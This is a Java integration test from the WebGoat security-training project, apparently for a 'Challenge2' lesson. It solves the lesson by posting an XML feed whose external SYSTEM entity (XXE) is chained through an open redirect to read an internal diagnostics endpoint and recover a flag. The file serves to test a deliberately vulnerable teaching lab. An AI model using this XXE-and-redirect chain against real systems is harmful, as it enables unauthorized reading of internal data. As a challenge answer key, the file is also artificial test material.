/*
 * SPDX-FileCopyrightText: Copyright © 2026 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.integration;

import static io.restassured.RestAssured.given;
import static org.assertj.core.api.Assertions.assertThat;
import static org.hamcrest.Matchers.equalTo;
import static org.hamcrest.Matchers.is;

import java.util.Map;
import org.junit.jupiter.api.Test;

public class Challenge2IntegrationTest extends IntegrationTest {

  @Test
  void recoverTheFlagThroughTheFeedImporter() {
    startLesson("Challenge2");

    String menu =
        given()
            .cookie("JSESSIONID", getWebGoatCookie())
            .get(webGoatUrlConfig.url("service/lessonmenu.mvc"))
            .then()
            .statusCode(200)
            .extract()
            .asString();
    assertThat(menu).contains("Challenge2.lesson");
    assertThat(menu.indexOf("Challenge2.lesson")).isGreaterThan(menu.indexOf("Challenge1.lesson"));
    assertThat(menu.indexOf("Challenge2.lesson")).isLessThan(menu.indexOf("Challenge5.lesson"));

    String diagnosticUrl = webGoatUrlConfig.url("northstar/internal/diagnostics");
    var directDiagnostic = given()
        .cookie("JSESSIONID", getWebGoatCookie())
        .get(diagnosticUrl);
    assertThat(directDiagnostic.statusCode())
        .describedAs("%s returned %s", diagnosticUrl, directDiagnostic.asString())
        .isEqualTo(401);

    given()
        .cookie("JSESSIONID", getWebGoatCookie())
        .get(webGoatUrlConfig.url("northstar/feeds"))
        .then()
        .statusCode(200)
        .body(equalTo("Partner bulletin: the evening edition is ready for review."));

    given()
        .cookie("JSESSIONID", getWebGoatCookie())
        .redirects()
        .follow(false)
        .queryParam("url", "https://example.org")
        .get(webGoatUrlConfig.url("northstar/go"))
        .then()
        .statusCode(302)
        .header("Location", equalTo("https://example.org"));

    given()
        .cookie("JSESSIONID", getWebGoatCookie())
        .formParam("xml", "<feed><story>Evening bulletin</story></feed>")
        .post(webGoatUrlConfig.url("northstar/import"))
        .then()
        .statusCode(200)
        .body("preview", is("Evening bulletin"));

    String internalUrl = webGoatUrlConfig.url("northstar/internal/diagnostics");
    given()
        .cookie("JSESSIONID", getWebGoatCookie())
        .formParam("xml", entityFeed(internalUrl))
        .post(webGoatUrlConfig.url("northstar/import"))
        .then()
        .statusCode(400);

    var chainedImport =
        given()
            .cookie("JSESSIONID", getWebGoatCookie())
            .formParam("xml", entityFeed("go?url=internal%2Fdiagnostics"))
            .post(webGoatUrlConfig.url("northstar/import"));
    assertThat(chainedImport.statusCode()).describedAs(chainedImport.asString()).isEqualTo(200);
    String flag = chainedImport.path("preview");

    checkAssignment(webGoatUrlConfig.url("northstar/recovery"), Map.of("flag", "bad"), false);
    checkAssignment(webGoatUrlConfig.url("northstar/recovery"), Map.of("flag", flag), true);
    checkResults("Challenge2");
  }

  private String entityFeed(String url) {
    return "<!DOCTYPE feed [<!ENTITY flag SYSTEM \"" + url + "\">]><feed>&flag;</feed>";
  }
}
